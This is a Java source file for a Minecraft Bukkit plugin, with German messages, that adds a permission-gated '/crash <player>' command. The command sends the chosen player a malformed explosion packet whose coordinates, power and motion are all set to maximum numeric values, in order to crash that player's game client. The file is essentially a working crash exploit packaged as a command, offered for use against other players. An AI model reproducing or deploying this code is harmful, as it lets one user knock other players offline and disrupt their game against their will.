package de.ghosterapi.commands;

import java.util.Collections;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;

/**
 * @author Ghoster#0001
 * @copyright Ghoster
 * Created on 22.07.2021 «» 12:36
 * Class «» CrashCommand
 **/

public class CrashCommand implements CommandExecutor {

    @SuppressWarnings("unchecked")
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

        Player p =(Player) sender;

        if(!p.hasPermission("ghosterapi.crash")){
            p.sendMessage("§cDu hast keine Berechtigungen für diesen Befehl!");
        } else {
            if(args.length == 0) {
                p.sendMessage("§cVerwendung: /crash <Spieler>");
            } else if(args.length == 1) {
                Player target = Bukkit.getServer().getPlayer(args[0]);
                if(target == null){
                    p.sendMessage("§cDer Spieler §e" + args[0] + " §cist nicht online!");

                } else if(target.getName().equalsIgnoreCase(p.getName())){
                    p.sendMessage("§cDu kannst dich nicht selber crashen!");
                } else {
                    ((CraftPlayer)target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE,
                            Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));

                    p.sendMessage("§aDu hast den Spieler §e" + target.getName() + " §agecrashed");
                }
            } else {
                p.sendMessage("§CVerwendung: /crash <Spieler>");
            }
        }

        return false;
    }


}
